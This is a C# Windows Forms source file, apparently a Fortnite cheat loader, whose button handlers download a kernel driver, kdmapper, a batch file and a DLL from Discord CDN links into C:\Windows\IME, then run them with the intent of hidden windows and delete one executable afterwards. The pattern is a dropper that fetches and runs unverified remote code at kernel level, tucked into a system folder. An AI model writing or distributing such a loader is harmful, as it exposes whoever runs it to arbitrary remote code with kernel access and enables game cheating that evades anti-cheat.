using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Gorge_Floyed_Epic_Notepad_Thingy_1._921
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void label2_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("https://discord.gg/qXJKTWF");
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Process.Start("http://trixloverz.rf.gd/");
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            WebClient webClient11 = new WebClient();
            string text5 = "C:\\Windows\\IME\\runme.bat";
            string text7 = "C:\\Windows\\IME\\driver.sys";
            webClient11.DownloadFile("https://cdn.discordapp.com/attachments/713466293575221289/749073740033163325/driver.sys", text7);
            webClient11.DownloadFile("https://cdn.discordapp.com/attachments/713466293575221289/749073735570423879/kdmapper.exe", text5);
            Process process699 = new Process();
            process699.StartInfo.FileName = "cmd.exe";
            process699.StartInfo.UseShellExecute = true;
            process699.StartInfo.CreateNoWindow = true;
            process699.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process699 = Process.Start(text5);
            Thread.Sleep(1000);
            MessageBox.Show("Open Fortnite, once in lobby click [inject] button!");
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
        }

        private void guna2Button4_Click(object sender, EventArgs e)
        {
            Form1.spoof();
        }

        public static void spoof()
        {
            WebClient webClient11 = new WebClient();
            string text2 = "C:\\Windows\\IME\\inject.bat";
            string text3 = "C:\\Windows\\IME\\modmap.exe";
            string text6 = "C:\\Windows\\IME\\Fortnite.dll";
            webClient11.DownloadFile("https://cdn.discordapp.com/attachments/713466293575221289/749073733951553617/inject.bat", text2);
            webClient11.DownloadFile("https://cdn.discordapp.com/attachments/713466293575221289/749073737000943797/modmap.exe", text3);
            webClient11.DownloadFile("https://cdn.discordapp.com/attachments/747938579795148841/749124332047040582/Fortnite.dll", text6);
            Process process699 = new Process();
            process699.StartInfo.FileName = "cmd.exe";
            process699.StartInfo.UseShellExecute = true;
            process699.StartInfo.CreateNoWindow = true;
            process699.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process699 = Process.Start(text2);
            process699 = Process.Start(text3);
            Thread.Sleep(1000);
            File.Delete(text3);
            Thread.Sleep(1000);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }
    }
}